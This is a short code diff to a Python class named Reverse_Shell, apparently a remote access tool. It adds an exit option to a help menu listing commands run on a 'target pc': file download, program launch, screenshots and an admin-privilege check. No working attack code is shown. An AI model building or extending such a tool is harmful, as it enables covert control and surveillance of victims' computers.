@@ -118,7 +118,8 @@ class Reverse_Shell:
                                    get url    -> Download a file from target website
                                    start path -> Start program on target pc
                                    screenshot -> take a screenshort of the target monitor
-                                   check      -> Check for administrator privileges '''
+                                   check      -> Check for administrator privileges 
+                                   q          -> Exit the reverse shell'''
                 self.reliable_send(help_options)
             else:
                 try:
